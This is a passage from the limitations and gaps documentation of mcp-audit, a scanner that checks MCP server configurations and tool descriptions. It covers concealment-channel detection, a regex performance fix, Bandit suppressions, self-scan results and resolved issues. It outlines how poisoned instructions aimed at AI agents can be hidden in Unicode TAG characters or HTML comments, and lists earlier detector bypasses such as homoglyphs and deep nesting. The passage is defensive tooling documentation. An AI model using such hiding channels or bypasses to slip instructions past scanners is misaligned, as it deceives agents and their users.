  *legitimate* use — CJK ideograph variant selection — so a bare-presence
  LOW signal analogous to POISON-042 cannot be assumed safe without
  checking that against real-world text first).
- **No recursive nesting.** A channel's decoded/extracted content is
  rescanned against `PATTERNS` exactly once. A TAG payload that itself
  contains an HTML comment, or an HTML comment whose body contains a
  further TAG-encoded run, is not specially unwrapped — only the first
  layer is decoded. Not observed in the wild; the design doc did not ask
  for it, and building it without a measured example would be exactly the
  "shipping a severity we cannot defend" trap `CLAUDE.md` already warns
  against for `FILE_WRITE + NETWORK_OUT` (R37).
- **HTML comment extraction is a plain non-greedy regex**
  (`<!--(.*?)-->` with `DOTALL`), matching standard comment semantics. It
  does not special-case a comment body that itself contains the literal
  substring `-->` (which HTML disallows in a well-formed comment anyway)
  or an unterminated `<!--` with no closing delimiter (which this regex
  simply does not match, i.e. treated as no comment present — the
  conservative, no-false-positive direction).
- **No `mcp-audit fix` strategy.** The design doc's scope is detection
  only — it does not mention a fixer strategy anywhere, and none was
  added. Removing a TAG-character run or an HTML comment from a config or
  agent file is a plausible future `fixer/strategies/` addition but is
  out of scope for STORY-0068; tracked here rather than built without a
  request.

## Missing capabilities

~~**Multi-arch binary CI release matrix**~~ **Resolved v0.4.0.** `release.yml` builds four PyInstaller executables in parallel on `v*.*.*` tag push: `macos-15-intel` (x86_64), `macos-latest` (arm64), `ubuntu-latest`, and `windows-latest`.

~~**pip packaging and TestPyPI dry run**~~ **Resolved v0.3.3.** PyPI Trusted Publishing (OIDC) pipeline in `release.yml` publishes to PyPI on every tag push. `pip install mcp-audit-scanner` resolves the current release. PEP 740 sigstore attestations are published alongside each wheel and sdist.

~~**Documentation beyond README**~~ **Resolved (incrementally through v0.9.0).** Comprehensive docs now exist in `docs/`: scoring, registry, writing-rules, governance, SAST rules, extensions, fleet scanning, baselines, snapshot, diff, killchain, shadow, live-connection, enterprise-deployment, and more.

- **Telemetry or usage analytics** — deliberately absent; see `docs/telemetry.md`.
- **Registry auto-growth** — the known-server registry requires manual contributions as the MCP ecosystem grows; `update-registry` pulls the latest committed version but does not discover new servers automatically

## Security limitations

Identified during the pre-launch security hardening pass (2026-04-17). Unfixed
limitations are documented here; fixed items are in "Recently resolved" above.

**B310 (`urllib.request` URL open) — three intentional Bandit suppressions (2026-04-17).**
Bandit flags all `urllib.request.urlretrieve` / `urlopen` calls with B310 because
they could in theory allow `file://` or custom scheme URLs. All three call sites in
this codebase are false positives: the URLs are either a hardcoded `https://` constant
(`_UPDATE_REGISTRY_URL` in `cli.py`) or produced by internal resolver functions that
always return `https://` scheme strings (`resolve_npm_tarball_url`,
`resolve_pip_tarball_url`). The `compute_hash_from_url` function additionally enforces
an explicit scheme guard (`if not url.startswith("https://"): raise ValueError(…)`)
as defense-in-depth before calling `urlretrieve`. Each suppression uses
`# nosec B310` with an inline one-line justification. No blanket `# nosec` without a
rule ID exists anywhere in the codebase.

~~**`save_license()` creates the config directory without explicit mode=0o700.**~~
Resolved in v0.2.0 by removing `licensing.py` entirely along with the
module refactor.

**`update-registry` directory `mkdir()` mode caveat.**
Prior to 2026-04-17, `cli.py update_registry` created `~/.config/mcp-audit/registry/`
without an explicit `mode=0o700`. This has been fixed: the directory is now
created with `mode=0o700` and the file written via `os.open(..., 0o600)`.

**TOCTOU in baseline `load()` and `export()`.**
Both methods call `path.exists()` and then `path.read_text()` as separate
operations. A race window exists between the check and the read. This is
inherent to the check-then-act pattern; the practical risk is low because the
storage directory is `0o700` (only the owning user can write to it). Using
`try: open(path)` / `except FileNotFoundError` would eliminate the race but
requires restructuring the error messages; deferred to a future refactor.

**Regex backtracking on adversarial tool descriptions — asserted by a live
test, not a 2026-04-23 memory (corrected R47, 2026-09-09).** The original
form of this note said "All 12 compiled patterns in `poisoning.py` were
benchmarked" against a 50,000-character adversarial string, as a one-off
measurement written into prose. Nothing re-ran it: by R47, `poisoning.py`
had grown to 14 `re.compile()` call sites (two added by STORY-0068's
concealment-channel work, see below) and the stale "12" invited misreading
as "every compiled regex in the file," which was never true and was no
longer even the right count for the list it did describe.

The claim is now `tests/test_analyzers.py::TestPatternReDoSBenchmark` —
parametrized directly over `poisoning.PATTERNS` (12 entries today), so it
covers however many entries exist at test-run time with no prose edit
required when one is added. Ceiling: 0.25s per pattern against
`"a" * 50_000 + "!"`; slowest observed is `POISON-020` at ~4.4ms, comfortably
under. If a future pattern exceeds the ceiling, the test fails and the
ceiling must not be raised to fit — the pattern needs to be rewritten.

The other two compiled regexes in the module are excluded from this test
**by construction, not by omission**: `_cooccurrence_regex()` (POISON-020's
co-occurrence gate) is a literal-alternation word-boundary regex with no
nested quantifiers, and is only ever searched against a small
`_COOCCURRENCE_WINDOW` slice, never the full text; `_TAG_CHAR_RE`
(POISON-041/042 TAG-character extraction) is a single linear character
class with no quantifier nesting. Neither has a backtracking degree of
freedom for an adversarial input to exploit. The HTML-comment side of
concealment-channel extraction — the one part of STORY-0068 that _did_ have
a real quadratic bug — has its own dedicated regression test, described
next.

**POISON-041/042 HTML-comment extraction — quadratic blowup found and fixed
during implementation, not shipped (STORY-0068, 2026-09-09).** The first
implementation used `<!--(.*?)-->` with `re.DOTALL`. On adversarial input
with many unclosed `<!--` openers and no `-->` anywhere (a plausible tool
description or `SKILL.md` body), the lazy-dot regex rescans forward to the
end of the string from *every* opener before concluding no match exists:
measured ~8s at 80,000 characters (20,000 repetitions of `"<!--"`), scaling
quadratically (confirmed 1k/2k/4k/8k repetitions roughly quadrupling time
per doubling). Replaced with a two-pointer `str.find()` walk
(`_iter_html_comment_bodies`) that never revisits already-scanned text and
returns as soon as no closing delimiter remains — same discipline as the
already-benchmarked `PATTERNS` regexes above. Measured after the fix:
40,000 repetitions (160,000 chars) in ~2ms.
`test_unterminated_html_comments_do_not_cause_quadratic_blowup` pins a
sub-second bound at 20,000 repetitions.

## Self-scan results (2026-04-23)

Results of running mcp-audit's own analysis pipeline against its own source,
as required before PyPI publication.

### `mcp-audit sast src/` (updated 2026-05-02)

Semgrep is now a dev extra (`uv sync --extra dev`). Self-scan run against
`src/mcp_audit/` using the bundled rule pack (`semgrep-rules/`):

```
semgrep --config semgrep-rules/ src/mcp_audit/
Rules run: 34 (Python rules only — TypeScript rules do not apply to .py files)
Targets scanned: 73 files
Findings: 0
```

**Result: zero findings.** No `# nosemgrep` suppressions needed.

Caveat: the venv-installed `semgrep` (via `uv run semgrep`) fails to start on
Python 3.12 due to an `opentelemetry-instrumentation` transitive dependency
bug (`ModuleNotFoundError: No module named 'pkg_resources'`). The scan above
used the system `semgrep` binary
(`/Library/Frameworks/Python.framework/Versions/3.12/bin/semgrep`).
`semgrep` is retained in the dev extras because the CI environment (Ubuntu,
Python 3.11) does not exhibit this issue and the `semgrep --test semgrep-rules/`
rule-fixture tests run cleanly there. The `pkg_resources` absence is a known
Python 3.12 + older `setuptools` interaction in specific venv configurations;
tracking as a future dependency hygiene item.

### `mcp-audit scan --check-vulns`
One finding: `rug_pull / claude-desktop/filesystem` (INFO severity).
**False positive** — rug-pull state file records a local "filesystem" server
that existed in a previous scan session on this machine and has since been
removed from the developer's Claude Desktop config.  This is expected
development-machine noise; the finding does not reflect a vulnerability in
mcp-audit itself.  Grade: A (100/100).

### `pip-audit`
Zero findings (run via `uv tool run pip-audit`).

### `bandit -r src/ -ll`
Zero medium+ findings after adding `# nosec B310` to five new `urlopen` call
sites in `attestation/sigstore_client.py`, `vulnerability/depsdev.py`,
`vulnerability/osv.py`, and `vulnerability/resolver.py` (all call HTTPS-only
hardcoded URLs), and `# nosec B104` to the wildcard-bind detection constant
in `analyzers/transport.py`.

---

## Closed gaps

Items below were confirmed open at some point and have since been resolved. Each entry records the gap ID or description, what fixed it, and in which version.

| Gap | Resolution | Version |
|-----|-----------|---------|
| Paid-license infrastructure (`licensing.py`, `_gate.py`, `activate`/`license` commands, `data/revoked.json`) | Removed entirely; mcp-audit is fully Apache 2.0 | v0.2.0 |
| `run_scan` and `run_scan_async` duplicated the analysis pipeline | Extracted `_run_static_pipeline()` as canonical implementation | v0.4.0 |
| `--no-score` leaked score into SARIF `run.properties` | `cli.py` nulls `result.score` before any formatter | v0.4.0 |
| Malformed JSON config silently swallowed | `result.errors` checked; exit 2 with human-readable message | v0.4.0 |
| Multi-arch binary CI release matrix not set up | `release.yml` matrix across 4 platforms | v0.4.0 |
| V-07: Unicode homoglyph bypass in poisoning detection | NFKD normalisation + `POISON-060` pattern | v0.5.0 (pre-release) |
| V-08: Nesting depth > 10 bypass in poisoning detection | Recursion limit raised to 50 | v0.5.0 (pre-release) |
| V-09: Wildcard interface binding not detected | `TRANSPORT-004` added | v0.5.0 (pre-release) |
| V-10: Privilege escalation coverage incomplete | `TRANSPORT-002` expanded with `pkexec`, `su`, `run0`, absolute paths | v0.5.0 (pre-release) |
| V-11: `yarn dlx` and `pipx` not detected | Added to `TransportAnalyzer` and `SupplyChainAnalyzer` | v0.5.0 (pre-release) |
| V-12: `httpx` in core dependencies | Moved to `[mcp]` optional extra | v0.4.0 |
| V-13: Version string hardcoded in 6 locations | Centralised via `importlib.metadata` in `__init__.py` | v0.4.0 (pre-release) |
| V-14: Missing LICENSE file / `pyproject.toml` alignment | Apache 2.0 `LICENSE` created; classifiers aligned | v0.4.0 (pre-release) |
| V-15: Placeholder URLs throughout codebase | All `yourusername` replaced with `adudley78` | v0.4.0 (pre-release) |
| pip packaging and TestPyPI dry run | PyPI Trusted Publishing (OIDC) in `release.yml` | v0.3.3 |
| SARIF not tested with GitHub | Schema validation tests + manual verification checklist | v0.8.0 (pre-release) |
| Nucleus FlexConnect not validated | Validated end-to-end against live Nucleus instance | v0.10.0 (pre-release) |
| Dashboard browser compatibility untested | Playwright cross-browser test suite added | v0.10.1 (pre-release) |
| Layer 2 (Sigstore provenance verification) not implemented | `--verify-signatures` shipped | v0.6.0 (pre-release) |
| Layer 3 (dependency CVE scanning) not implemented | `--check-vulns` shipped via deps.dev + OSV.dev | v0.6.0 (pre-release) |
| Registry size below launch target | 75 entries, exceeding launch target | v0.7.0 |
| Levenshtein threshold false positives for short names | Short-name threshold tightened to 1 edit for ≤ 5 chars | v0.5.1 |
| No registry metadata enrichment | `RegistryEntry` carries `first_published`, `weekly_downloads`, `publisher_history` | v0.5.0 (pre-release) |
| `--dir` non-recursive in fleet merge | `rglob("*.json")` replaces `glob("*.json")` | v0.5.1 |
| Fleet HTML output was a simplified Rich table | D3-powered fleet dashboard with machine cards and filterable table | v0.6.0 |
| Windows extension paths not validated | `_get_windows_paths()` added; covered by monkeypatched unit tests | v0.5.1 |
| Documentation beyond README not written | Comprehensive `docs/` directory covers all features | incremental through v0.9.0 |
| Server stderr leaked to terminal during `--connect` | stderr captured; `--verbose` to surface it | v0.6.0 |
| No authentication support for SSE/HTTP servers | `--connect-token TOKEN` flag added | v0.6.0 |
| V-16: `_home()` inconsistency — Windows branch of `_get_client_specs()` called `Path.home()` directly | Replaced with `_home()`; regression test added | v0.9.2 |
| V-17: Credential regex gaps — no GCP, Azure SAS, DigitalOcean, Vercel, PEM, Vault, or GitHub fine-grained PAT coverage | 8 new patterns added to `credentials.py`; matching Semgrep rules added; 13 new tests | v0.10.0 |
